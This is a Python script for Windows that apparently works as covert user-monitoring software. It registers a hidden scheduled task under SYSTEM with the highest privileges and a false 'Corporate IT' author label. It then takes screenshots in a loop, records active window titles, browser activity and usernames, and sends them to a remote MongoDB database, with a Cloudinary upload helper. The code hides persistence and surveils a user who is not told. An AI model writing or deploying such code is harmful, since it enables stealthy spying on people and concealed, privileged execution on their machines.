#!/usr/bin/env python
"""
Production-Ready Script to Automatically Create a Hidden Scheduled Task
that runs a specified executable.
Additionally, this file integrates activity logging via MongoDB and Cloudinary.
"""

import sys
import subprocess

# --- Auto-install missing packages ---
required_packages = {
    "pyautogui": "pyautogui",
    "pymongo": "pymongo",
    "psutil": "psutil",
    "cloudinary": "cloudinary",
    "pywin32": "win32com",
    "pillow": "PIL",
    "pyscreeze": "pyscreeze"
}

def install_missing_packages():
    missing = []
    for pip_name, module_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing.append(pip_name)
    if missing:
        print("Installing missing packages:", missing)
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])

install_missing_packages()

import datetime
import logging
import time
import os
import pyautogui
import pymongo
import psutil
import cloudinary
import cloudinary.uploader

# For Windows active window capture
try:
    import win32gui
except ImportError:
    print("win32gui module not found. On Windows, install pywin32 to capture active window titles.")

import win32com.client  # For scheduled task creation

# --- Configuration for Cloudinary and MongoDB ---
cloudinary.config(
    cloud_name="YOUR_CLOUD_NAME",
    api_key="YOUR_API_KEY",
    api_secret="YOUR_API_SECRET"
)

mongo_client = pymongo.MongoClient("YOUR_MONGO_URI")
db = mongo_client["activity_db"]
log_collection = db["user_logs"]

# --- New Flat Logging Functions ---

def log_user_event(username, event, process_name, timestamp):
    """
    Logs login or logout events with username, event (login/logout), process_name, and timestamp.
    """
    event_doc = {
        "username": username,
        "event": event,
        "process_name": process_name,
        "timestamp": timestamp.isoformat()
    }
    log_collection.insert_one(event_doc)
    print(f"Logged user event: {event_doc}")

def log_browser_tab_activity(username, active_window, active_url, start_time, end_time):
    """
    Logs browser tab activity (active window and URL) with timestamps marking start and end.
    """
    event_doc = {
        "username": username,
        "active_window": active_window,
        "active_url": active_url,
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat()
    }
    log_collection.insert_one(event_doc)
    print(f"Logged browser tab activity: {event_doc}")

def log_app_activity(username, active_window, screenshot, start_time, end_time):
    """
    Logs application activity with active window, screenshot file path, and timestamps.
    """
    event_doc = {
        "username": username,
        "active_window": active_window,
        "screenshot": screenshot,
        "start_time": start_time.isoformat(),
        "end_time": end_time.isoformat()
    }
    log_collection.insert_one(event_doc)
    print(f"Logged app activity: {event_doc}")

# --- Logging for Scheduled Task Creation ---
def setup_logging():
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler("task_creation.log")
    fh.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    return logger

def create_hidden_task(task_name, exe_path, start_time=None):
    logger = logging.getLogger(__name__)
    try:
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
    except Exception as e:
        logger.error("Failed to connect to Task Scheduler service: %s", e)
        raise

    try:
        root_folder = scheduler.GetFolder("\\")
        task_def = scheduler.NewTask(0)
        task_def.RegistrationInfo.Author = "Corporate IT"
        task_def.RegistrationInfo.Description = f"Hidden Task: {task_name}"
        task_def.Principal.UserId = "SYSTEM"
        task_def.Principal.LogonType = 5  # TASK_LOGON_SERVICE_ACCOUNT
        task_def.Principal.RunLevel = 1   # TASK_RUNLEVEL_HIGHEST
        task_def.Settings.Hidden = True
        task_def.Settings.Enabled = True
        task_def.Settings.StopIfGoingOnBatteries = False
        task_def.Settings.DisallowStartIfOnBatteries = False
        if start_time is None:
            start_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
        trigger = task_def.Triggers.Create(1)  # TASK_TRIGGER_TIME
        trigger.StartBoundary = start_time.isoformat()
        trigger.Enabled = True
        action = task_def.Actions.Create(0)  # TASK_ACTION_EXEC
        action.Path = exe_path
        if "\\" in exe_path:
            action.WorkingDirectory = exe_path.rsplit("\\", 1)[0]
        else:
            action.WorkingDirectory = ""
        TASK_CREATE_OR_UPDATE = 6
        TASK_LOGON_SERVICE_ACCOUNT = 5
        registered_task = root_folder.RegisterTaskDefinition(
            task_name,
            task_def,
            TASK_CREATE_OR_UPDATE,
            "",
            "",
            TASK_LOGON_SERVICE_ACCOUNT
        )
        logger.info("Scheduled task '%s' created successfully.", task_name)
        return registered_task
    except Exception as e:
        logger.error("Failed to create task '%s': %s", task_name, e)
        raise

# --- Utility Functions ---
def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    except Exception as e:
        return f"Unable to get active window: {e}"

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    file_path = "screenshot.png"
    screenshot.save(file_path)
    return file_path

def upload_to_cloudinary(file_path):
    try:
        response = cloudinary.uploader.upload(file_path, folder="monitoring system")
        return response.get("secure_url")
    except Exception as e:
        return f"Upload error: {e}"

# --- Modified Event Functions ---
def simulate_user_login():
    username = os.getlogin()
    now = datetime.datetime.now()
    log_user_event(username, "login", "login_process", now)
    print(f"User {username} login captured.")

def simulate_user_logout():
    username = os.getlogin()
    now = datetime.datetime.now()
    log_user_event(username, "logout", "logout_process", now)
    print(f"User {username} logout captured.")

def capture_activity():
    """
    Captures activity and logs it based on whether the active window is a browser.
    For browser tabs, logs active window, active_url, start_time, and end_time.
    For other applications, logs active window, screenshot, and the timestamps.
    """
    username = os.getlogin()
    active_window = get_active_window_title()
    start_time = datetime.datetime.now()

    if any(browser in active_window for browser in ["Chrome", "Firefox", "Edge"]):
        # For browser tabs, try to capture URL from the window title.
        active_url = active_window  # In a real scenario, further processing would be needed.
        # Simulate end time (e.g., next capture cycle)
        end_time = start_time + datetime.timedelta(seconds=10)
        log_browser_tab_activity(username, active_window, active_url, start_time, end_time)
    else:
        screenshot_path = capture_screenshot()
        # Simulate end time (e.g., next capture cycle)
        end_time = start_time + datetime.timedelta(seconds=10)
        log_app_activity(username, active_window, screenshot_path, start_time, end_time)
    print("Activity captured and logged.")

# --- Scheduled Task Mode ---
def scheduled_task_mode():
    logger = setup_logging()
    if len(sys.argv) < 4:
        logger.error("Usage: %s task <TaskName> <FullPathToExe> [StartTime in ISO format]", sys.argv[0])
        sys.exit(1)
    task_name = sys.argv[2]
    exe_path = sys.argv[3]
    if len(sys.argv) >= 5:
        try:
            start_time = datetime.datetime.fromisoformat(sys.argv[4])
        except Exception as e:
            logger.error("Invalid start time format. Use ISO format (YYYY-MM-DDTHH:MM:SS). Error: %s", e)
            sys.exit(1)
    else:
        start_time = None

    try:
        create_hidden_task(task_name, exe_path, start_time)
        print("Scheduled task created successfully.")
    except Exception as e:
        logger.error("Failed to create scheduled task: %s", e)
        sys.exit(1)

# --- Main Loop ---
def main():
    if len(sys.argv) > 1 and sys.argv[1] == "task":
        scheduled_task_mode()
        return

    simulate_user_login()
    try:
        while True:
            capture_activity()
            time.sleep(60)
    except KeyboardInterrupt:
        simulate_user_logout()

if __name__ == "__main__":
    main()